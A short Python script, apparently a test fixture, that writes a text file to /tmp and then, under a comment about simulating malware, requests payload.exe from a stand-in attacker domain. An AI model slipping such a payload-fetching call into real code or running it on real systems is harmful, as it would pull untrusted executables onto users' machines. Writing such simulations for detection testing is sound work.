
import os
def main():
    file_path = "/tmp/test.txt"
    print(f"Opening file: {file_path}")
    with open(file_path, "w") as f:
        f.write("Hello World")
    
    # Simulating malware behavior for testing
    import urllib.request
    urllib.request.urlopen("http://malicious-domain-example.com/payload.exe")
    
if __name__ == '__main__':
    main()
